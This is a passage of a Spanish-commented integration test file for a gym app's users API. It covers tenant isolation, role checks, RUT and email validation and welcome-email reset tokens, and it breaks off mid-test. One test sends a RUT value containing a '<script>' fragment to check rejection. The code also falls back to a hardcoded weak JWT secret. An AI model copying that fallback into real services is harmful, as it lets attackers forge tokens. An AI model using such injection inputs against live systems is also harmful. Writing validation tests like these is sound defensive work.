/**
 * users.integration.test.ts
 *
 * Tests de integración para el módulo de usuarios (CRUD).
 * Usa fastify.inject() — sin levantar puerto real.
 * Usa la DB real (fitapp_dev) — sin mocks de Prisma.
 *
 * Casos cubiertos:
 *   1. GET /users — filtrado por gymId del JWT (aislamiento multi-tenant)
 *   2. GET /users — filtros por role y status
 *   3. GET /users/:id — usuario propio del gym / usuario de otro gym
 *   4. POST /users — validación de campos, email duplicado mismo gym, email duplicado otro gym,
 *      correo de bienvenida con link de reset (mustChangePassword + PasswordResetToken)
 *   5. POST /users — RUT duplicado en mismo gym
 *   6. PUT /users/:id — campos editables, email en uso, usuario de otro gym
 *   7. POST /users/:id/reset-password — setea mustChangePassword=true, validaciones
 *   8. Permisos: MEMBER bloqueado en endpoints de admin; COACH bloqueado en endpoints de admin
 *
 * Setup:
 *   - Gym A (slug: qa-users-gym-a) con admin, coach y member
 *   - Gym B (slug: qa-users-gym-b) con admin y member separados
 *
 * Cleanup:
 *   - Borra usuarios y gyms creados por ID al finalizar
 */

import { describe, it, expect, beforeAll, afterAll, vi } from 'vitest'
import Fastify, { FastifyInstance } from 'fastify'
import jwt from '@fastify/jwt'
import bcrypt from 'bcryptjs'

// createUser() manda un correo de bienvenida con link de reset (ver
// users.service.ts) — se mockea para no depender de red real (Ethereal) en CI,
// mismo patrón que auth.integration.test.ts.
const { sendEmail } = vi.hoisted(() => ({
  sendEmail: vi.fn(async (_params: { from: string; to: string; subject: string; html: string }) => ({ ethereal: false })),
}))
vi.mock('../../../lib/email', () => ({
  sendEmail,
  buildFrom: (name: string) => `${name} <noreply@test.local>`,
  escapeHtml: (v: string) => v,
  wrapInLayout: (...args: unknown[]) => String(args[4] ?? ''),
  getPlatformLogoUrl: vi.fn().mockResolvedValue(null),
  sendUserWelcomeEmail: (data: { userEmail: string }) =>
    sendEmail({ from: 'test <noreply@test.local>', to: data.userEmail, subject: 'bienvenida', html: '' }),
}))

import { userRoutes } from '../users.routes'
import { prisma } from '../../../lib/prisma'

// ─── Constantes de fixtures ───────────────────────────────────────────────────

const JWT_SECRET = process.env.JWT_SECRET || 'super_secret_dev_key_cambiar_en_produccion'
const TEST_PASSWORD = 'password123'

const GYM_A_SLUG = 'qa-users-gym-a'
const GYM_B_SLUG = 'qa-users-gym-b'

// IDs creados en setup — para cleanup limpio en afterAll
let gymAId: string
let gymBId: string
let adminAId: string
let coachAId: string
let memberAId: string
let adminBId: string
let memberBId: string

// Tokens JWT
let adminAToken: string
let coachAToken: string
let memberAToken: string
let adminBToken: string

// IDs de usuarios extra creados en tests — para cleanup
const createdUserIds: string[] = []

// ─── Helper: construir la app Fastify mínima ──────────────────────────────────

async function buildApp(): Promise<FastifyInstance> {
  const app = Fastify({ logger: false })
  await app.register(jwt, { secret: JWT_SECRET })
  await app.register(userRoutes, { prefix: '/api' })
  await app.ready()
  return app
}

// ─── Setup / Teardown global ──────────────────────────────────────────────────

beforeAll(async () => {
  const passwordHash = await bcrypt.hash(TEST_PASSWORD, 10)

  // Limpiar residuos de runs anteriores
  for (const slug of [GYM_A_SLUG, GYM_B_SLUG]) {
    const existingGym = await prisma.gym.findUnique({ where: { slug } })
    if (existingGym) {
      const users = await prisma.user.findMany({ where: { gymId: existingGym.id }, select: { id: true } })
      if (users.length) {
        const userIds = users.map(u => u.id)
        await prisma.membership.deleteMany({ where: { userId: { in: userIds } } })
        await prisma.booking.deleteMany({ where: { userId: { in: userIds } } })
        await prisma.user.deleteMany({ where: { gymId: existingGym.id } })
      }
      await prisma.plan.deleteMany({ where: { gymId: existingGym.id } })
      await prisma.gym.delete({ where: { id: existingGym.id } })
    }
  }

  // Crear Gym A
  const gymA = await prisma.gym.create({
    data: { name: 'QA Users Gym A', slug: GYM_A_SLUG, status: 'ACTIVE' },
  })
  gymAId = gymA.id

  // Crear Gym B
  const gymB = await prisma.gym.create({
    data: { name: 'QA Users Gym B', slug: GYM_B_SLUG, status: 'ACTIVE' },
  })
  gymBId = gymB.id

  // Crear usuarios en Gym A
  const adminA = await prisma.user.create({
    data: { gymId: gymAId, name: 'Admin Users A', email: 'qa-users-admin-a@test.local', passwordHash, role: 'ADMIN' },
  })
  adminAId = adminA.id

  const coachA = await prisma.user.create({
    data: { gymId: gymAId, name: 'Coach Users A', email: 'qa-users-coach-a@test.local', passwordHash, role: 'COACH' },
  })
  coachAId = coachA.id

  const memberA = await prisma.user.create({
    data: { gymId: gymAId, name: 'Member Users A', email: 'qa-users-member-a@test.local', passwordHash, role: 'MEMBER' },
  })
  memberAId = memberA.id

  // Crear usuarios en Gym B
  const adminB = await prisma.user.create({
    data: { gymId: gymBId, name: 'Admin Users B', email: 'qa-users-admin-b@test.local', passwordHash, role: 'ADMIN' },
  })
  adminBId = adminB.id

  const memberB = await prisma.user.create({
    data: { gymId: gymBId, name: 'Member Users B', email: 'qa-users-member-b@test.local', passwordHash, role: 'MEMBER' },
  })
  memberBId = memberB.id

  // Generar tokens
  const tempApp = Fastify({ logger: false })
  await tempApp.register(jwt, { secret: JWT_SECRET })
  await tempApp.ready()

  adminAToken = tempApp.jwt.sign({ userId: adminAId, gymId: gymAId, email: 'qa-users-admin-a@test.local', role: 'ADMIN', name: 'Admin Users A' })
  coachAToken = tempApp.jwt.sign({ userId: coachAId, gymId: gymAId, email: 'qa-users-coach-a@test.local', role: 'COACH', name: 'Coach Users A' })
  memberAToken = tempApp.jwt.sign({ userId: memberAId, gymId: gymAId, email: 'qa-users-member-a@test.local', role: 'MEMBER', name: 'Member Users A' })
  adminBToken = tempApp.jwt.sign({ userId: adminBId, gymId: gymBId, email: 'qa-users-admin-b@test.local', role: 'ADMIN', name: 'Admin Users B' })

  await tempApp.close()
})

afterAll(async () => {
  // Limpiar usuarios extra creados en tests
  if (createdUserIds.length) {
    await prisma.membership.deleteMany({ where: { userId: { in: createdUserIds } } })
    await prisma.user.deleteMany({ where: { id: { in: createdUserIds } } })
  }
  // Limpiar fixtures
  const allFixtureIds = [adminAId, coachAId, memberAId, adminBId, memberBId].filter(Boolean)
  await prisma.membership.deleteMany({ where: { userId: { in: allFixtureIds } } })
  await prisma.user.deleteMany({ where: { id: { in: allFixtureIds } } })
  await prisma.gym.deleteMany({ where: { id: { in: [gymAId, gymBId].filter(Boolean) } } })
  await prisma.$disconnect()
})

// ─── Suite 1: GET /users — autenticación y aislamiento ───────────────────────

describe('Users: GET /api/users — autenticación y aislamiento multi-tenant', () => {
  let app: FastifyInstance

  beforeAll(async () => { app = await buildApp() })
  afterAll(async () => { await app.close() })

  it('sin token → 401', async () => {
    const res = await app.inject({ method: 'GET', url: '/api/users' })
    expect(res.statusCode).toBe(401)
  })

  it('admin de Gym A ve solo usuarios de Gym A', async () => {
    const res = await app.inject({
      method: 'GET',
      url: '/api/users',
      headers: { authorization: `Bearer ${adminAToken}` },
    })
    expect(res.statusCode).toBe(200)
    const body = res.json()
    expect(Array.isArray(body)).toBe(true)

    // Todos deben ser del gym A
    for (const u of body) {
      expect(u.gymId).toBe(gymAId)
    }
    // No debe aparecer ningún usuario del gym B
    const gymBIds = [adminBId, memberBId]
    const leaked = body.filter((u: any) => gymBIds.includes(u.id))
    expect(leaked).toHaveLength(0)
  })

  it('admin de Gym B ve solo usuarios de Gym B', async () => {
    const res = await app.inject({
      method: 'GET',
      url: '/api/users',
      headers: { authorization: `Bearer ${adminBToken}` },
    })
    expect(res.statusCode).toBe(200)
    const body = res.json()

    const gymAIds = [adminAId, coachAId, memberAId]
    const leaked = body.filter((u: any) => gymAIds.includes(u.id))
    expect(leaked).toHaveLength(0)
  })

  it('MEMBER no puede listar usuarios → 403 (requiere COACH o ADMIN)', async () => {
    const res = await app.inject({
      method: 'GET',
      url: '/api/users',
      headers: { authorization: `Bearer ${memberAToken}` },
    })
    expect(res.statusCode).toBe(403)
  })
})

// ─── Suite 2: GET /users — filtros por role y status ─────────────────────────

describe('Users: GET /api/users — filtros role y status', () => {
  let app: FastifyInstance

  beforeAll(async () => { app = await buildApp() })
  afterAll(async () => { await app.close() })

  it('sin ?role devuelve solo MEMBER por defecto', async () => {
    const res = await app.inject({
      method: 'GET',
      url: '/api/users',
      headers: { authorization: `Bearer ${adminAToken}` },
    })
    expect(res.statusCode).toBe(200)
    const body = res.json()
    // El default es role=MEMBER
    for (const u of body) {
      expect(u.role).toBe('MEMBER')
    }
    // El admin y coach de gym A NO deben aparecer en la lista por defecto
    const adminInList = body.find((u: any) => u.id === adminAId)
    expect(adminInList).toBeUndefined()
    const coachInList = body.find((u: any) => u.id === coachAId)
    expect(coachInList).toBeUndefined()
  })

  it('?role=ADMIN devuelve solo admins del gym', async () => {
    const res = await app.inject({
      method: 'GET',
      url: '/api/users?role=ADMIN',
      headers: { authorization: `Bearer ${adminAToken}` },
    })
    expect(res.statusCode).toBe(200)
    const body = res.json()
    for (const u of body) {
      expect(u.role).toBe('ADMIN')
    }
    const adminInList = body.find((u: any) => u.id === adminAId)
    expect(adminInList).toBeDefined()
  })

  it('?role=COACH devuelve solo coaches del gym', async () => {
    const res = await app.inject({
      method: 'GET',
      url: '/api/users?role=COACH',
      headers: { authorization: `Bearer ${adminAToken}` },
    })
    expect(res.statusCode).toBe(200)
    const body = res.json()
    for (const u of body) {
      expect(u.role).toBe('COACH')
    }
    const coachInList = body.find((u: any) => u.id === coachAId)
    expect(coachInList).toBeDefined()
  })

  it('?role=MEMBER,COACH devuelve múltiples roles', async () => {
    const res = await app.inject({
      method: 'GET',
      url: '/api/users?role=MEMBER,COACH',
      headers: { authorization: `Bearer ${adminAToken}` },
    })
    expect(res.statusCode).toBe(200)
    const body = res.json()
    const roles = [...new Set(body.map((u: any) => u.role))]
    // Debe haber al menos MEMBER y COACH
    expect(roles).toContain('MEMBER')
    expect(roles).toContain('COACH')
    // No debe haber ADMIN
    expect(roles).not.toContain('ADMIN')
  })

  it('?role=MEMBER devuelve usuarios con memberships incluidos', async () => {
    const res = await app.inject({
      method: 'GET',
      url: '/api/users?role=MEMBER',
      headers: { authorization: `Bearer ${adminAToken}` },
    })
    expect(res.statusCode).toBe(200)
    const body = res.json()
    const member = body.find((u: any) => u.id === memberAId)
    expect(member).toBeDefined()
    // memberships es un array (puede estar vacío si no tiene membresía)
    expect(Array.isArray(member.memberships)).toBe(true)
  })

  it('una membresía ACTIVE no queda tapada por una transferencia rechazada más nueva', async () => {
    // Regresión QA 2026-10-30 (H01): listUsers tomaba la membresía más reciente por
    // createdAt, no la ACTIVE vigente — un alumno activo con una transferencia
    // rechazada DESPUÉS aparecía como "Inactivo" en la lista.
    const passwordHash = await bcrypt.hash('x', 10)
    const user = await prisma.user.create({
      data: { gymId: gymAId, name: 'QA Membership Order', email: 'qa-users-membership-order@test.local', passwordHash, role: 'MEMBER' },
    })
    createdUserIds.push(user.id)
    const plan = await prisma.plan.create({
      data: { gymId: gymAId, name: 'QA Plan Order', priceCents: 10000, currency: 'CLP', durationDays: 30 },
    })

    // Membresía ACTIVE, creada primero
    await prisma.membership.create({
      data: {
        userId: user.id, planId: plan.id, status: 'ACTIVE',
        startsAt: new Date(), endsAt: new Date(Date.now() + 30 * 24 * 60 * 60 * 1000),
        pricePaid: 10000, currency: 'CLP',
      },
    })
    // Transferencia rechazada, creada DESPUÉS (createdAt más reciente)
    await prisma.membership.create({
      data: {
        userId: user.id, planId: plan.id, status: 'INACTIVE', transferStatus: 'REJECTED',
        startsAt: new Date(), endsAt: new Date(Date.now() + 30 * 24 * 60 * 60 * 1000),
        pricePaid: 10000, currency: 'CLP',
      },
    })

    const res = await app.inject({
      method: 'GET',
      url: '/api/users?role=MEMBER',
      headers: { authorization: `Bearer ${adminAToken}` },
    })
    expect(res.statusCode).toBe(200)
    const found = res.json().find((u: any) => u.id === user.id)
    expect(found).toBeDefined()
    expect(found.memberships[0]?.status).toBe('ACTIVE')

    await prisma.plan.delete({ where: { id: plan.id } })
  })
})

// ─── Suite 3: GET /users/:id ──────────────────────────────────────────────────

describe('Users: GET /api/users/:id', () => {
  let app: FastifyInstance

  beforeAll(async () => { app = await buildApp() })
  afterAll(async () => { await app.close() })

  it('admin de Gym A puede ver su propio miembro', async () => {
    const res = await app.inject({
      method: 'GET',
      url: `/api/users/${memberAId}`,
      headers: { authorization: `Bearer ${adminAToken}` },
    })
    expect(res.statusCode).toBe(200)
    const body = res.json()
    expect(body.id).toBe(memberAId)
    expect(body.gymId).toBe(gymAId)
    // Incluye memberships y rmRecords
    expect(Array.isArray(body.memberships)).toBe(true)
    expect(Array.isArray(body.rmRecords)).toBe(true)
  })

  it('admin de Gym A NO puede ver un usuario de Gym B → 404', async () => {
    const res = await app.inject({
      method: 'GET',
      url: `/api/users/${memberBId}`,
      headers: { authorization: `Bearer ${adminAToken}` },
    })
    expect(res.statusCode).toBe(404)
    expect(res.json().error).toMatch(/no encontrado/i)
  })

  it('usuario inexistente → 404', async () => {
    const res = await app.inject({
      method: 'GET',
      url: '/api/users/00000000-0000-0000-0000-000000000000',
      headers: { authorization: `Bearer ${adminAToken}` },
    })
    expect(res.statusCode).toBe(404)
  })

  it('sin token → 401', async () => {
    const res = await app.inject({
      method: 'GET',
      url: `/api/users/${memberAId}`,
    })
    expect(res.statusCode).toBe(401)
  })
})

// ─── Suite 3b: GET /users/:id — benchmarkHistory (feat/wod-benchmark-link) ───

describe('Users: GET /api/users/:id — benchmarkHistory solo incluye resultados de WODs con benchmark', () => {
  let app: FastifyInstance
  let classTypeId: string
  let wodWithBenchmarkId: string
  let wodPlainId: string
  let benchmarkId: string

  beforeAll(async () => {
    app = await buildApp()

    const classType = await prisma.classType.create({
      data: { gymId: gymAId, name: 'QA Users ClassType', color: '#222222' },
    })
    classTypeId = classType.id

    const benchmark = await prisma.benchmark.create({
      data: { nombre: 'QA Users Benchmark Historial', categoria: 'HERO', formato: 'For time', isOfficial: false, gymId: gymAId },
    })
    benchmarkId = benchmark.id

    const wodWithBenchmark = await prisma.wod.create({
      data: { gymId: gymAId, classTypeId, title: 'WOD con benchmark', date: new Date(), scoreType: 'TIME', benchmarkId },
    })
    wodWithBenchmarkId = wodWithBenchmark.id

    const wodPlain = await prisma.wod.create({
      data: { gymId: gymAId, classTypeId, title: 'WOD normal (sin benchmark)', date: new Date(), scoreType: 'REPS' },
    })
    wodPlainId = wodPlain.id

    // Resultado del alumno sobre el WOD que viene de un benchmark → debe aparecer
    await prisma.wodResult.create({
      data: { gymId: gymAId, wodId: wodWithBenchmarkId, userId: memberAId, score: 240, rx: true, recordedBy: memberAId },
    })
    // Resultado del alumno sobre un WOD normal → NO debe aparecer en benchmarkHistory
    await prisma.wodResult.create({
      data: { gymId: gymAId, wodId: wodPlainId, userId: memberAId, score: 100, rx: false, recordedBy: memberAId },
    })
  })

  afterAll(async () => {
    await prisma.wodResult.deleteMany({ where: { wodId: { in: [wodWithBenchmarkId, wodPlainId] } } })
    await prisma.wod.deleteMany({ where: { id: { in: [wodWithBenchmarkId, wodPlainId] } } })
    await prisma.benchmark.delete({ where: { id: benchmarkId } })
    await prisma.classType.delete({ where: { id: classTypeId } })
    await app.close()
  })

  it('benchmarkHistory incluye solo el resultado del WOD con benchmarkId, no el del WOD normal', async () => {
    const res = await app.inject({
      method: 'GET',
      url: `/api/users/${memberAId}`,
      headers: { authorization: `Bearer ${adminAToken}` },
    })
    expect(res.statusCode).toBe(200)
    const body = res.json()
    expect(Array.isArray(body.benchmarkHistory)).toBe(true)

    const ids = body.benchmarkHistory.map((h: any) => h.benchmarkId)
    expect(ids).toContain(benchmarkId)
    expect(body.benchmarkHistory).toHaveLength(1)

    const entry = body.benchmarkHistory[0]
    expect(entry.benchmarkName).toBe('QA Users Benchmark Historial')
    expect(entry.benchmarkCategory).toBe('HERO')
    expect(entry.score).toBe(240)
    expect(entry.rx).toBe(true)
    expect(entry.scoreFormatted).toBe('4:00') // formatScore con scoreType TIME: 240s = 4:00

    // El resultado del WOD normal no debe filtrarse acá
    expect(body.wodResults).toBeUndefined() // el campo crudo se reemplaza por benchmarkHistory
  })

  it('GET /users/me (mismo endpoint vía service) también expone benchmarkHistory filtrado', async () => {
    const res = await app.inject({
      method: 'GET',
      url: '/api/users/me',
      headers: { authorization: `Bearer ${memberAToken}` },
    })
    expect(res.statusCode).toBe(200)
    const body = res.json()
    expect(body.benchmarkHistory).toHaveLength(1)
    expect(body.benchmarkHistory[0].benchmarkId).toBe(benchmarkId)
  })
})

// ─── Suite 4: POST /users — crear usuario ────────────────────────────────────

describe('Users: POST /api/users — crear usuario', () => {
  let app: FastifyInstance

  beforeAll(async () => { app = await buildApp() })
  afterAll(async () => { await app.close() })

  it('sin token → 401', async () => {
    const res = await app.inject({
      method: 'POST',
      url: '/api/users',
      payload: { name: 'Test', email: 'test@test.local' },
    })
    expect(res.statusCode).toBe(401)
  })

  it('MEMBER intenta crear usuario → 403', async () => {
    const res = await app.inject({
      method: 'POST',
      url: '/api/users',
      headers: { authorization: `Bearer ${memberAToken}` },
      payload: { name: 'Test', email: 'new-member@test.local' },
    })
    expect(res.statusCode).toBe(403)
    expect(res.json().error).toMatch(/administrador/i)
  })

  it('COACH intenta crear usuario → 403', async () => {
    const res = await app.inject({
      method: 'POST',
      url: '/api/users',
      headers: { authorization: `Bearer ${coachAToken}` },
      payload: { name: 'Test', email: 'new-coach-user@test.local' },
    })
    expect(res.statusCode).toBe(403)
  })

  it('campos requeridos faltantes → 400 con errores de validación', async () => {
    const res = await app.inject({
      method: 'POST',
      url: '/api/users',
      headers: { authorization: `Bearer ${adminAToken}` },
      payload: {}, // falta name y email
    })
    expect(res.statusCode).toBe(400)
  })

  it('name muy corto (menos de 2 caracteres) → 400', async () => {
    const res = await app.inject({
      method: 'POST',
      url: '/api/users',
      headers: { authorization: `Bearer ${adminAToken}` },
      payload: { name: 'A', email: 'short@test.local' },
    })
    expect(res.statusCode).toBe(400)
  })

  it('email inválido → 400', async () => {
    const res = await app.inject({
      method: 'POST',
      url: '/api/users',
      headers: { authorization: `Bearer ${adminAToken}` },
      payload: { name: 'Test User', email: 'no-es-un-email' },
    })
    expect(res.statusCode).toBe(400)
  })

  it('admin crea usuario MEMBER correctamente → 201, manda correo de bienvenida con link de reset', async () => {
    sendEmail.mockClear()
    const res = await app.inject({
      method: 'POST',
      url: '/api/users',
      headers: { authorization: `Bearer ${adminAToken}` },
      payload: {
        name: 'Nuevo Alumno',
        email: 'qa-users-nuevo-alumno@test.local',
        role: 'MEMBER',
        phone: '+56912345678',
        gender: 'M',
      },
    })
    expect(res.statusCode).toBe(201)
    const body = res.json()
    expect(body.id).toBeDefined()
    expect(body.name).toBe('Nuevo Alumno')
    expect(body.email).toBe('qa-users-nuevo-alumno@test.local')
    expect(body.gymId).toBe(gymAId)
    expect(body.role).toBe('MEMBER')
    // BUG-SECURITY corregido: passwordHash no debe exponerse en respuestas de la API
    expect(body.passwordHash).toBeUndefined()
    createdUserIds.push(body.id)

    // Correo de bienvenida: link de reset, no contraseña en texto plano
    expect(sendEmail).toHaveBeenCalledOnce()
    expect(sendEmail.mock.calls[0][0].to).toBe('qa-users-nuevo-alumno@test.local')

    const token = await prisma.passwordResetToken.findFirst({ where: { userId: body.id, usedAt: null } })
    expect(token).not.toBeNull()
    expect(token!.expiresAt.getTime()).toBeGreaterThan(Date.now() + 55 * 60 * 1000)

    const created = await prisma.user.findUnique({ where: { id: body.id } })
    expect(created?.mustChangePassword).toBe(true)
  })

  it('admin crea usuario COACH correctamente → 201, también manda correo de bienvenida', async () => {
    sendEmail.mockClear()
    const res = await app.inject({
      method: 'POST',
      url: '/api/users',
      headers: { authorization: `Bearer ${adminAToken}` },
      payload: {
        name: 'Nuevo Coach',
        email: 'qa-users-nuevo-coach@test.local',
        role: 'COACH',
      },
    })
    expect(res.statusCode).toBe(201)
    const body = res.json()
    createdUserIds.push(body.id)
    expect(sendEmail).toHaveBeenCalledOnce()
    const token = await prisma.passwordResetToken.findFirst({ where: { userId: body.id, usedAt: null } })
    expect(token).not.toBeNull()
  })

  it('si el correo de bienvenida falla, el usuario queda creado igual → 201', async () => {
    sendEmail.mockRejectedValueOnce(new Error('smtp down'))
    const res = await app.inject({
      method: 'POST',
      url: '/api/users',
      headers: { authorization: `Bearer ${adminAToken}` },
      payload: { name: 'Email Falla', email: 'qa-users-email-falla@test.local' },
    })
    expect(res.statusCode).toBe(201)
    createdUserIds.push(res.json().id)
  })

  it('email duplicado en el mismo gym → 400 con mensaje de error descriptivo', async () => {
    // El email de memberA ya existe en Gym A
    const res = await app.inject({
      method: 'POST',
      url: '/api/users',
      headers: { authorization: `Bearer ${adminAToken}` },
      payload: {
        name: 'Otro Usuario',
        email: 'qa-users-member-a@test.local', // email duplicado en gym A
      },
    })
    expect(res.statusCode).toBe(400)
    expect(res.json().error).toMatch(/email ya está registrado/i)
  })

  it('email duplicado en el mismo gym con otra capitalización → 400 (normalizado a minúsculas)', async () => {
    // El email de memberA ya existe en Gym A como qa-users-member-a@test.local
    const res = await app.inject({
      method: 'POST',
      url: '/api/users',
      headers: { authorization: `Bearer ${adminAToken}` },
      payload: {
        name: 'Otro Usuario Mayúsculas',
        email: 'QA-Users-Member-A@Test.LOCAL',
      },
    })
    expect(res.statusCode).toBe(400)
    expect(res.json().error).toMatch(/email ya está registrado/i)
  })

  it('email duplicado en otro gym se permite → 201 (emails son por gym)', async () => {
    // memberA tiene email qa-users-member-a@test.local en gymA
    // Admin B crea un usuario con el mismo email en gymB → debe funcionar
    const res = await app.inject({
      method: 'POST',
      url: '/api/users',
      headers: { authorization: `Bearer ${adminBToken}` },
      payload: {
        name: 'Mismo Email Otro Gym',
        email: 'qa-users-member-a@test.local', // mismo email, pero en gymB
      },
    })
    expect(res.statusCode).toBe(201)
    const body = res.json()
    expect(body.gymId).toBe(gymBId)
    createdUserIds.push(body.id)
  })

  it('RUT duplicado en el mismo gym → 400', async () => {
    // Crear primer usuario con RUT
    const first = await app.inject({
      method: 'POST',
      url: '/api/users',
      headers: { authorization: `Bearer ${adminAToken}` },
      payload: {
        name: 'Usuario Con RUT',
        email: 'qa-users-rut-first@test.local',
        rut: '12345678-5',
      },
    })
    expect(first.statusCode).toBe(201)
    createdUserIds.push(first.json().id)

    // Crear segundo usuario con mismo RUT en mismo gym → 400
    const second = await app.inject({
      method: 'POST',
      url: '/api/users',
      headers: { authorization: `Bearer ${adminAToken}` },
      payload: {
        name: 'Otro Usuario Con RUT',
        email: 'qa-users-rut-second@test.local',
        rut: '12345678-5',
      },
    })
    expect(second.statusCode).toBe(400)
    expect(second.json().error).toMatch(/RUT ya está registrado/i)
  })

  it('RUT duplicado en otro gym se permite → 201', async () => {
    const res = await app.inject({
      method: 'POST',
      url: '/api/users',
      headers: { authorization: `Bearer ${adminBToken}` },
      payload: {
        name: 'Rut Otro Gym',
        email: 'qa-users-rut-other-gym@test.local',
        rut: '12345678-5', // mismo RUT, gymB → permitido
      },
    })
    expect(res.statusCode).toBe(201)
    createdUserIds.push(res.json().id)
  })

  it('RUT con dígito verificador incorrecto → 400', async () => {
    const res = await app.inject({
      method: 'POST',
      url: '/api/users',
      headers: { authorization: `Bearer ${adminAToken}` },
      payload: {
        name: 'RUT Inválido',
        email: 'qa-users-rut-bad-checkdigit@test.local',
        rut: '12345678-9', // dígito verificador real es 5, no 9
      },
    })
    expect(res.statusCode).toBe(400)
  })

  it('RUT con formato libre ("no-es-un-rut") → 400', async () => {
    const res = await app.inject({
      method: 'POST',
      url: '/api/users',
      headers: { authorization: `Bearer ${adminAToken}` },
      payload: {
        name: 'RUT Formato Libre',
        email: 'qa-users-rut-free-format@test.local',
        rut: 'no-es-un-rut-12345<script>',
      },
    })
    expect(res.statusCode).toBe(400)
  })

  it('RUT con puntos se normaliza y acepta (mismo dígito verificador)', async () => {
    const res = await app.inject({
      method: 'POST',
      url: '/api/users',
      headers: { authorization: `Bearer ${adminAToken}` },
      payload: {
        name: 'RUT Con Puntos',
        email: 'qa-users-rut-con-puntos@test.local',
        rut: '87.654.321-4',
      },
    })
    expect(res.statusCode).toBe(201)
    expect(res.json().rut).toBe('87654321-4')
    createdUserIds.push(res.json().id)
  })

  it('fecha de nacimiento futura → 400', async () => {
    const res = await app.inject({
      method: 'POST',
      url: '/api/users',
      headers: { authorization: `Bearer ${adminAToken}` },
      payload: {
        name: 'Nace En El Futuro',
        email: 'qa-users-birthdate-future@test.local',
        birthDate: '2099-01-01',
      },
    })
    expect(res.statusCode).toBe(400)
  })

  it('role inválido → 400', async () => {
    const res = await app.inject({
      method: 'POST',
      url: '/api/users',
      headers: { authorization: `Bearer ${adminAToken}` },
      payload: {
        name: 'Usuario Rol Invalido',
        email: 'qa-users-bad-role@test.local',
        role: 'SUPER_ADMIN', // no permitido en createUserSchema
      },
    })
    expect(res.statusCode).toBe(400)
  })

  it('source inválido → 400', async () => {
    const res = await app.inject({
      method: 'POST',
      url: '/api/users',
      headers: { authorization: `Bearer ${adminAToken}` },
      payload: {
        name: 'Usuario Source Invalido',
        email: 'qa-users-bad-source@test.local',
        source: 'tiktok', // no está en enum
      },
    })
    expect(res.statusCode).toBe(400)
  })
})

// ─── Suite 5: PUT /users/:id — actualizar usuario ────────────────────────────

describe('Users: PUT /api/users/:id — actualizar usuario', () => {
  let app: FastifyInstance
  let targetUserId: string

  beforeAll(async () => {
    app = await buildApp()
    const passwordHash = await bcrypt.hash(TEST_PASSWORD, 10)
    const user = await prisma.user.create({
      data: {
        gymId: gymAId,
        name: 'Usuario Para Editar',
        email: 'qa-users-editar@test.local',
        passwordHash,
        role: 'MEMBER',
      },
    })
    targetUserId = user.id
    createdUserIds.push(targetUserId)
  })

  afterAll(async () => { await app.close() })

  it('sin token → 401', async () => {
    const res = await app.inject({
      method: 'PUT',
      url: `/api/users/${targetUserId}`,
      payload: { name: 'Nuevo Nombre' },
    })
    expect(res.statusCode).toBe(401)
  })

  it('MEMBER intenta actualizar → 403', async () => {
    const res = await app.inject({
      method: 'PUT',
      url: `/api/users/${targetUserId}`,
      headers: { authorization: `Bearer ${memberAToken}` },
      payload: { name: 'Nuevo Nombre' },
    })
    expect(res.statusCode).toBe(403)
  })

  it('admin actualiza nombre y teléfono → 200', async () => {
    const res = await app.inject({
      method: 'PUT',
      url: `/api/users/${targetUserId}`,
      headers: { authorization: `Bearer ${adminAToken}` },
      payload: { name: 'Nombre Actualizado', phone: '+56987654321' },
    })
    expect(res.statusCode).toBe(200)
    const body = res.json()
    expect(body.name).toBe('Nombre Actualizado')
    expect(body.phone).toBe('+56987654321')
    expect(body.id).toBe(targetUserId)
  })

  it('admin actualiza email a uno disponible → 200', async () => {
    const res = await app.inject({
      method: 'PUT',
      url: `/api/users/${targetUserId}`,
      headers: { authorization: `Bearer ${adminAToken}` },
      payload: { email: 'qa-users-editar-nuevo@test.local' },
    })
    expect(res.statusCode).toBe(200)
    expect(res.json().email).toBe('qa-users-editar-nuevo@test.local')
  })

  it('admin intenta cambiar email a uno ya en uso en el mismo gym → 400', async () => {
    // memberA ya tiene qa-users-member-a@test.local
    const res = await app.inject({
      method: 'PUT',
      url: `/api/users/${targetUserId}`,
      headers: { authorization: `Bearer ${adminAToken}` },
      payload: { email: 'qa-users-member-a@test.local' },
    })
    expect(res.statusCode).toBe(404) // updateUser lanza error y la ruta devuelve 404
    expect(res.json().error).toMatch(/email ya está en uso/i)
  })

  it('admin de Gym A no puede actualizar usuario de Gym B → 404', async () => {
    const res = await app.inject({
      method: 'PUT',
      url: `/api/users/${memberBId}`,
      headers: { authorization: `Bearer ${adminAToken}` },
      payload: { name: 'Intento Cross-Gym' },
    })
    expect(res.statusCode).toBe(404)
    expect(res.json().error).toMatch(/no encontrado/i)
  })

  it('usuario inexistente → 404', async () => {
    const res = await app.inject({
      method: 'PUT',
      url: '/api/users/00000000-0000-0000-0000-000000000000',
      headers: { authorization: `Bearer ${adminAToken}` },
      payload: { name: 'Inexistente' },
    })
    expect(res.statusCode).toBe(404)
  })

  it('email inválido en update → 400', async () => {
    const res = await app.inject({
      method: 'PUT',
      url: `/api/users/${targetUserId}`,
      headers: { authorization: `Bearer ${adminAToken}` },
      payload: { email: 'no-es-email' },
    })
    expect(res.statusCode).toBe(400)
  })

  it('update con RUT duplicado en el mismo gym → 404 (error del servicio)', async () => {
    // Primero crear un usuario con un RUT específico
    const passwordHash = await bcrypt.hash(TEST_PASSWORD, 10)
    const userWithRut = await prisma.user.create({
      data: {
        gymId: gymAId,
        name: 'Usuario Con RUT Existente',
        email: 'qa-users-rut-existing@test.local',
        passwordHash,
        role: 'MEMBER',
        rut: '99887766-0',
      },
    })
    createdUserIds.push(userWithRut.id)

    // Intentar poner ese mismo RUT en targetUserId
    const res = await app.inject({
      method: 'PUT',
      url: `/api/users/${targetUserId}`,
      headers: { authorization: `Bearer ${adminAToken}` },
      payload: { rut: '99887766-0' },
    })
    expect(res.statusCode).toBe(404)
    expect(res.json().error).toMatch(/RUT ya está registrado/i)
  })

  it('bajarle el rol al único ADMIN del gym → 404 (bloqueado), su rol no cambia', async () => {
    // adminA es el único ADMIN de gymA (fixture de este archivo)
    const res = await app.inject({
      method: 'PUT',
      url: `/api/users/${adminAId}`,
      headers: { authorization: `Bearer ${adminAToken}` },
      payload: { role: 'COACH' },
    })
    expect(res.statusCode).toBe(404)
    expect(res.json().error).toMatch(/único administrador/i)

    const stillAdmin = await prisma.user.findUnique({ where: { id: adminAId } })
    expect(stillAdmin?.role).toBe('ADMIN')
  })

  it('bajarle el rol a un ADMIN cuando hay otro → 200 (permitido)', async () => {
    const passwordHash = await bcrypt.hash(TEST_PASSWORD, 10)
    const secondAdmin = await prisma.user.create({
      data: { gymId: gymAId, name: 'Segundo Admin', email: 'qa-users-second-admin@test.local', passwordHash, role: 'ADMIN' },
    })
